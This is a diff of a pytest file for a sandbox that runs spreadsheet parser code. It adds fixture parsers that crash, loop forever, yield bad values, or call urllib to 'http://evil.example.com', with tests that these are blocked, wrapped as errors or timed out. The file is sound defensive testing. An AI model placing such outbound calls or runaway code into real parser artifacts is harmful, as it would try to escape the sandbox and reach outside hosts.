@@ -8,7 +8,6 @@ parser code are test fixtures, not a claim of bank-specific capability.
 import os
 import sys
 import tempfile
-import uuid
 from pathlib import Path
 
 import pytest
@@ -111,6 +110,75 @@ def parse(wb, ctx):
         )
 '''
 
+# Generator that yields a row then raises an exception
+GENERATOR_CRASH_CODE = '''
+from fund.primitives.canonical import emit_row
+
+def parse(wb, ctx):
+    yield emit_row(
+        business_date=None,
+        entity_code="E001",
+        entity_name="TestEntity",
+        account_code="A001",
+        account_name="TestAccount",
+        summary="before crash",
+        counterparty=None,
+        amount_in=10,
+        amount_out=0,
+        rolling_balance=None,
+        source="网银导入",
+    )
+    raise ValueError("generator crashed mid-way")
+'''
+
+# Generator that yields non-dict
+GENERATOR_NON_DICT_CODE = '''
+def parse(wb, ctx):
+    yield "not a dict"
+'''
+
+# Generator that does network access via urllib inside iteration
+GENERATOR_NETWORK_CODE = '''
+import urllib.request
+
+def parse(wb, ctx):
+    yield {"key": "first"}
+    urllib.request.urlopen("http://evil.example.com")
+    yield {"key": "second"}
+'''
+
+# Infinite loop parser (no imports needed — uses pure Python busy loop)
+INFINITE_LOOP_CODE = '''
+def parse(wb, ctx):
+    x = 0
+    while True:
+        x += 1
+    yield {}
+'''
+
+_counter = 0
+
+
+def _next_id():
+    global _counter
+    _counter += 1
+    return _counter
+
+
+def _make_artifact(db, code=SIMPLE_PARSER_CODE, status="active"):
+    art = ParserArtifact(
+        name=f"test_parser_{_next_id()}",
+        kind="bank",
+        version=1,
+        code=code,
+        primitives_imports="[]",
+        status=status,
+    )
+    db.add(art)
+    db.commit()
+    db.refresh(art)
+    return art
+
 
 @pytest.fixture(scope="module")
 def db_engine():
@@ -145,29 +213,6 @@ def xlsx_file():
         wb.save(f.name)
         yield f.name
     os.unlink(f.name)
-
-
-_counter = 0
-
-def _next_id():
-    global _counter
-    _counter += 1
-    return _counter
-
-
-def _make_artifact(db, code=SIMPLE_PARSER_CODE, status="active"):
-    art = ParserArtifact(
-        name=f"test_parser_{_next_id()}",
-        kind="bank",
-        version=1,
-        code=code,
-        primitives_imports="[]",
-        status=status,
-    )
-    db.add(art)
-    db.commit()
-    db.refresh(art)
-    return art
 
 
 # ── run_parser: active artifact returns rows ──
@@ -309,3 +354,74 @@ def test_run_parser_uses_ctx_for_account(db_session, xlsx_file):
 
     # Same parser, same file, different ctx → different account归属
     assert rows_a[0]["account_code"] != rows_b[0]["account_code"]
+
+
+# ═══════════════════════════════════════════════════════
+# Fix D: New tests for execution boundary fixes
+# ═══════════════════════════════════════════════════════
+
+
+# ── Fix D-1: generator iteration exception wrapped ──
+
+def test_generator_crash_wrapped_as_execution_error(db_session, xlsx_file):
+    """Generator yields a row then raises — error is ArtifactExecutionError."""
+    art = _make_artifact(db_session, code=GENERATOR_CRASH_CODE)
+    with pytest.raises(ArtifactExecutionError, match="generator crashed mid-way"):
+        list(run_parser(db_session, art.id, xlsx_file))
+
+
+# ── Fix D-1b: generator yields non-dict ──
+
+def test_generator_non_dict_row_wrapped_as_execution_error(db_session, xlsx_file):
+    """Generator yields a non-dict value — wrapped as ArtifactExecutionError."""
+    art = _make_artifact(db_session, code=GENERATOR_NON_DICT_CODE)
+    with pytest.raises(ArtifactExecutionError, match="expected dict, got str"):
+        list(run_parser(db_session, art.id, xlsx_file))
+
+
+# ── Fix D-2: generator execution under no_ai_runtime ──
+
+def test_generator_network_access_blocked_during_iteration(db_session, xlsx_file):
+    """Generator that attempts urllib access during iteration is blocked."""
+    art = _make_artifact(db_session, code=GENERATOR_NETWORK_CODE)
+    with pytest.raises((ArtifactExecutionError, Exception)):
+        list(run_parser(db_session, art.id, xlsx_file))
+
+
+# ── Fix D-3: timeout protection ──
+
+def test_parser_timeout_raises_sandbox_timeout_error(db_session, xlsx_file, monkeypatch):
+    """Infinite loop parser triggers SandboxTimeoutError with short timeout."""
+    from core import artifact_sandbox
+    short_config = artifact_sandbox.ArtifactSandboxConfig(timeout_seconds=1)
+    monkeypatch.setattr(
+        artifact_sandbox,
+        "get_default_sandbox_config",
+        lambda: short_config,
+    )
+    art = _make_artifact(db_session, code=INFINITE_LOOP_CODE)
+    with pytest.raises(SandboxTimeoutError, match="timed out after 1s"):
+        list(run_parser(db_session, art.id, xlsx_file))
+
+
+# ── Fix D-4: workbook file handle released ──
+
+def test_workbook_closed_after_successful_parse(db_session, xlsx_file):
+    """After parsing, xlsx file can be renamed/deleted (handle released)."""
+    art = _make_artifact(db_session)
+    list(run_parser(db_session, art.id, xlsx_file))
+    # If workbook is still open, os.unlink at fixture teardown would fail on Windows
+    # Also verify we can open the file for writing
+    with open(xlsx_file, "rb") as f:
+        header = f.read(4)
+        assert header[:2] == b"PK"  # xlsx is a zip
+
+
+def test_workbook_closed_after_parse_error(db_session, xlsx_file):
+    """After a parse error, xlsx file handle is still released."""
+    art = _make_artifact(db_session, code=CRASH_PARSER_CODE)
+    with pytest.raises(ArtifactExecutionError):
+        list(run_parser(db_session, art.id, xlsx_file))
+    with open(xlsx_file, "rb") as f:
+        header = f.read(4)
+        assert header[:2] == b"PK"
